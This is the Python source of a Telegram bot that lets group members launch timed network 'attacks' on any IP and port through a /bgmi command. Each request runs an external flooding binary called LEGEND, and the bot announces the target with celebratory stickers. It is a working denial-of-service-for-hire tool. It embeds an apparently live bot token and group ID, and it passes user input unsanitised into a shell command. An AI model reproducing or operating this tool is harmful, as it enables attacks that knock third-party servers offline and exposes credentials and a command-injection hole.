#!/usr/bin/python3 import telebot import subprocess import random import os import threading

# Insert your Telegram bot token here

bot = telebot.TeleBot('8106529658:AAHw00Zdcg-KiNkKZSXhmmHjUQS4wY3nXb8')

Group details

GROUP_ID = "-1002463590258" GROUP_INVITE_LINK = "https://t.me/botid3434"

Attack settings

MAX_ATTACK_TIME = 90 LEGEND_PATH = "./LEGEND"

Attack tracking

attack_lock = threading.Lock() attack_active = False current_attacker = None

Predefined list of funny sticker URLs

funny_stickers = [ "https://media.giphy.com/media/3o7abKhOpu0NwenH3O/giphy.gif", "https://media.giphy.com/media/l0HlHFRbmaZtBRhXG/giphy.gif", "https://media.giphy.com/media/fuJPZBIIqzbt1kAYVc/giphy.gif", "https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif", "https://media.giphy.com/media/26AHONQ79FdWZhAI0/giphy.gif" ]

Function to get a random funny sticker

def get_random_sticker(): return random.choice(funny_stickers)

Function to check if a user is in the group

def is_user_in_group(user_id): try: member = bot.get_chat_member(GROUP_ID, user_id) return member.status in ['member', 'administrator', 'creator'] except Exception: return False

Function to restrict bot usage to group members & only inside the group

def restricted_access(func): def wrapper(message): user_id = str(message.from_user.id)

if not is_user_in_group(user_id):
        bot.reply_to(message, f"🚀 **Join our group first!**\n🔗 [Click Here to Join]({GROUP_INVITE_LINK})", parse_mode="Markdown")
        return
    
    if str(message.chat.id) != GROUP_ID:
        bot.reply_to(message, "❌ **You can use this command only in the group!**")
        return
    
    return func(message)
return wrapper

@bot.message_handler(commands=['bgmi']) @restricted_access def handle_bgmi(message): global attack_active, current_attacker

user_id = message.from_user.id
username = message.from_user.first_name

with attack_lock:
    if attack_active:
        bot.reply_to(message, f"⚠️ **Another attack is already running!**\n👤 **Current Attacker:** {current_attacker}")
        return
    
    attack_active = True
    current_attacker = username

command = message.text.split()

if len(command) != 4:
    bot.reply_to(message, "Usage: /bgmi <IP> <PORT> <TIME>")
    with attack_lock:
        attack_active = False
        current_attacker = None
    return

target, port, time_duration = command[1], command[2], command[3]

try:
    port = int(port)
    time_duration = int(time_duration)
    if time_duration > MAX_ATTACK_TIME:
        bot.reply_to(message, f"❌ Maximum attack time is {MAX_ATTACK_TIME} seconds.")
        with attack_lock:
            attack_active = False
            current_attacker = None
        return
except ValueError:
    bot.reply_to(message, "❌ Error: PORT and TIME must be integers.")
    with attack_lock:
        attack_active = False
        current_attacker = None
    return

# Ensure LEGEND is executable
if not os.path.exists(LEGEND_PATH):
    bot.reply_to(message, "❌ Error: LEGEND executable not found.")
    with attack_lock:
        attack_active = False
        current_attacker = None
    return

if not os.access(LEGEND_PATH, os.X_OK):
    os.chmod(LEGEND_PATH, 0o755)

# Get a random funny sticker
sticker_url = get_random_sticker()

bot.send_animation(message.chat.id, sticker_url,
                   caption=f"🚀 **Attack Started!**\n🎯 Target: `{target}:{port}`\n⚡ **Status:** `Running...`\n👤 **Attacker:** {username}",
                   parse_mode="Markdown")

def run_attack():
    global attack_active, current_attacker
    try:
        full_command = f"{LEGEND_PATH} {target} {port} {time_duration} "
        subprocess.run(full_command, shell=True, capture_output=True, text=True)
    except Exception as e:
        bot.reply_to(message, f"❌ Unexpected error: {str(e)}")
    finally:
        with attack_lock:
            attack_active = False
            current_attacker = None
        
        finished_sticker = get_random_sticker()
        bot.send_animation(message.chat.id, finished_sticker, caption=f"✅ **Attack Finished!**\n🎯 Target: `{target}:{port}`", parse_mode="Markdown")

# Run attack in a separate thread
threading.Thread(target=run_attack, daemon=True).start()

@bot.message_handler(commands=['sticker']) @restricted_access def send_random_sticker(message): sticker_url = get_random_sticker() bot.send_animation(message.chat.id, sticker_url, caption="🤣 Here's a funny sticker for you!")

@bot.message_handler(commands=['start']) @restricted_access def welcome_start(message): bot.reply_to(message, f"🚀 Welcome!\nJoin our group first to use this bot:\n🔗 Join Here", parse_mode="Markdown")

Start polling

bot.polling(none_stop=True)

